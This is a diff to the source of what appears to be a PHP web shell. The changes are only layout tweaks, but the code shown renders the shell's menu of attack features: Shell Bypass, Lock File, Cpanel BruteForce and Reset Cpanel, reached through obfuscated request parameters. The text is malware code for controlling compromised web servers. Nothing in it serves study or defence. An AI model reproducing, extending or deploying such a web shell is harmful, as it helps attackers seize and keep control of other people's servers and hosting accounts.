@@ -749,6 +749,7 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet">Lock File</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("shell-bypass").'=opet">Shell Bypass</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("string-tools").'=opet">String Tools</button>
+<br>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("cpbrute").'=opet">Cpanel BruteForce</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
         exit();
@@ -989,7 +990,7 @@ echo "<table class='directory-listing-table'><td>
     }
     fclose($fp);
 }elseif ($_GET[net('string-tools')]=='opet') {
-    echo' <center><table class="directory-listing-table">
+    echo' <center>
     <h3>: String Tools :</h3>
     [<a href="?act='.$_GET['act'].'&replace='.$_GET['stringtools'].'">Auto replace String</a>]<br>
     <font color=white> NOTE : This tool is an improvement from the enc0de dec0de script and I added coventer</font>
@@ -1461,6 +1462,7 @@ echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
         } else {
             createDirectory();
         }exit();
+
 } elseif ($_REQUEST[net('info')] == "opet") {
     echo "<table class='directory-listing-table' align='center'>
     <div id='content'><tr><td>";
